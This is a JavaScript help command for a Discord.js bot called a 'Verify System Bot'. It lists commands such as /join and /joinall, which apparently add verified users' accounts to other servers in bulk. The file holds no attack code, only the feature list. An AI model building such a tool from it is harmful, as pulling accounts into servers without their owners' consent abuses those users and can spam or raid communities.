const discord = require("discord.js");
const epic = require("../../epic");

module.exports = {
  name: "help",
  description: "Bot help",
  default_permission: true,
  category: "whitelist",
  userPerms: [discord.PermissionFlagsBits.SendMessages],
  ownerOnly: false,

  run: async (client, interaction, args) => {
    await interaction.reply({
      embeds: [
        new discord.EmbedBuilder()
          .setTitle(`Verify System Bot Commands`)
            .setDescription(`\`\`\`yaml
/user => Show Users.
/refresh => Refresh Users.
/clean => Clear the Database.
/join => Join the Server with the Specified Number of Members.
/joinall => Join the Server with all of Members.
/ping => Measure the Ping Status of the Bot (Latency).
/wl add => Give Permissions to Someone Else in Your Bot.
/wl remove => Remove the Permission You Gave to That Person by Tagging Them.
/server => Remove or Add Your Bot from Remote Servers.
/stop => Stop the Users You Started on That Server.\`\`\``)
          .setFooter({
            text: "by epic",
          }),
      ],
      ephemeral: false,
    });
  },
};
